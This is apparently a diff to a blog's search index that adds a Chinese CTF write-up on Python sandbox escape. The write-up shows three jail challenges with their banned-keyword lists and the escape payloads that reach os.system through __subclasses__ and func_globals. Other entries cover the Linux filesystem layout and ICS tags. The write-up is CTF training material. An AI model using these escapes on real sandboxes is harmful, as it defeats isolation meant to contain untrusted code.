@@ -1,6 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Python沙箱逃逸（CTF）]]></title>
+    <url>%2F2018%2F10%2F18%2FPython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%EF%BC%88CTF%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[案例1def make_secure(): UNSAFE = [&apos;open&apos;, &apos;file&apos;, &apos;execfile&apos;, &apos;compile&apos;, &apos;reload&apos;, &apos;__import__&apos;, &apos;eval&apos;, &apos;input&apos;] for func in UNSAFE: del __builtins__.__dict__[func] from re import findall # Remove dangerous builtins make_secure() print &apos;Go Ahead, Expoit me &gt;;D&apos; while True: try: print &quot;&gt;&gt;&gt;&quot;, # Read user input until the first whitespace character inp = findall(&apos;\S+&apos;, raw_input())[0] a = None # Set a to the result from executing the user input exec &apos;a=&apos; + inp print &apos;&gt;&gt;&gt;&apos;, a except Exception, e: print &apos;Exception:&apos;, e 下面是脚本运行的效果。效果相当于python的命令界面，我们的目标是读取当前目录下的flag文件。如果题目没有任何的过滤，读取的命令如下，导入os包，然后直接执行命令。 但是直接导入os会报错，如下图因为 del 命令删除了对应的命令，如下图看了Ned Batchelder的分享后学到了新知识。我们可以用file对象read文件下面是元类和元类型详细信息，元组，子对象由于file在索引40，我们可以硬编码。如下图用file类型读取flag文件。 案例2#!/usr/bin/env python from __future__ import print_function print(&quot;Welcome to my Python sandbox! Enter commands below!&quot;) banned = [ &quot;import&quot;, &quot;exec&quot;, &quot;eval&quot;, &quot;pickle&quot;, &quot;os&quot;, &quot;subprocess&quot;, &quot;kevin sucks&quot;, &quot;input&quot;, &quot;banned&quot;, &quot;cry sum more&quot;, &quot;sys&quot; ] targets = __builtins__.__dict__.keys() targets.remove(&apos;raw_input&apos;) targets.remove(&apos;print&apos;) for x in targets: del __builtins__.__dict__[x] while 1: print(&quot;&gt;&gt;&gt;&quot;, end=&apos; &apos;) data = raw_input() for no in banned: if no.lower() in data.lower(): print(&quot;No bueno&quot;) break else: # this means nobreak exec data 相对于第一题，第二题是没有直接的回显。我们可以用catch_warnings类（索引在59），进行命令执行。 ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;) 案例3# -*-coding:utf-8-*- #!/usr/bin/python3 import sys, cmd, os del __builtins__.__dict__[&apos;__import__&apos;] del __builtins__.__dict__[&apos;eval&apos;] intro = &quot;&quot;&quot; pwnhub cuit pwn everything Rules: -No import -No ... -No flag &quot;&quot;&quot; def execute(command): exec(command, globals()) class Jail(cmd.Cmd): prompt = &apos;&gt;&gt;&gt; &apos; filtered = &apos;\&apos;|.|input|if|else|eval|exit|import|quit|exec|code|const|vars|str|chr|ord|local|global|join|format|replace|translate|try|except|with|content|frame|back&apos;.split(&apos;|&apos;) def do_EOF(self, line): sys.exit() def emptyline(self): return cmd.Cmd.emptyline(self) def default(self, line): sys.stdout.write(&apos;\x00&apos;) def postcmd(self, stop, line): if any(f in line for f in self.filtered): print(&quot;You are a big hacker !!!&quot;) print(&quot;Go away&quot;) else: try: execute(line) except NameError: print(&quot;NameError: name &apos;%s&apos; is not defined&quot; % line) except Exception: print(&quot;Error: %s&quot; % line) return cmd.Cmd.postcmd(self, stop, line) if __name__ == &quot;__main__&quot;: try: Jail().cmdloop(intro) except KeyboardInterrupt: print(&quot;\rSee you next time !&quot;) 这题是cuit2017的题目，python3环境。这里主要过滤了大量的字符，包括1，2题所用的点号。 print(getattr(os, “system”) 获取system函数地址， print(getattr(os, “system”)(“ls”)) 执行system(“ls”)下面是获取flag的姿势 以上都是利用Python作为脚本语言的特性来逃逸]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>ctf</tag>
+        <tag>沙箱逃逸</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Linux文件系统]]></title>
     <url>%2F2018%2F10%2F17%2FLinux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
     <content type="text"><![CDATA[rootfs其实就是，针对特定的操作系统的架构，一种实现的形式;具体表现为，特定的目录（就理解为windows的文文件夹），目录之间的关系，即组织架构，以及特定的各种文件；/boot：系统启动的相关文件，如内核， initrd，以及grup（bootloader)，建议单独分区，分区千万不要做lvm/dev：设备文件 块设备：随机访问，以数据块为单位 字符设备：线性访问，以字符为单位 设备号：主设备和次设备号 /etc：配置文件/home：用户的家目录，每一个用户对应一个（当然在创建用户时，可不创建），建议单独分区/root：管理员的家目录，不可单独分区/lib：库文件/lib/modules：内核模块文件 静态库: 以.a结尾 动态库: 以.so结尾（类似windows .dll文件） /media：挂载点目录，以移动设备为主/mnt：挂载点目录，以额外临时文件系统为主（如：USB设备）/opt：可选目录，时期是用来安装第三方软件/proc：伪文件系统，内核映射文件，不可单独分区，默认为空/sys：伪文件系统，跟硬件设备相关属性的映射文件，不可单独分区，默认为空/tmp：临时文件/var/tmp：临时文件/bin：可执行文件，主要是用户执行命令/sbin：可执行文件，主要是管理命令/usr(universal share read-only)：只读文件/usr/bin：执行文件/usr/sbin：执行文件/usr/lib：库文件/usr/local：第三方软件安装目录 /usr/local/bin /usr/local/sbin /usr/local/lib busybox详细介绍：https://www.ibm.com/developerworks/cn/linux/l-busybox/]]></content>
@@ -153,9 +167,9 @@
         <category>工控安全</category>
       </categories>
       <tags>
-        <tag>ICS</tag>
         <tag>ctf</tag>
         <tag>write up</tag>
+        <tag>ICS</tag>
         <tag>plc</tag>
         <tag>梯形图</tag>
       </tags>
@@ -168,10 +182,10 @@
         <category>工控安全</category>
       </categories>
       <tags>
-        <tag>ICS</tag>
         <tag>modbus</tag>
         <tag>ctf</tag>
         <tag>write up</tag>
+        <tag>ICS</tag>
       </tags>
   </entry>
   <entry>
@@ -194,8 +208,8 @@
         <category>工控安全</category>
       </categories>
       <tags>
-        <tag>ICS</tag>
         <tag>modbus</tag>
+        <tag>ICS</tag>
         <tag>工控协议</tag>
       </tags>
   </entry>
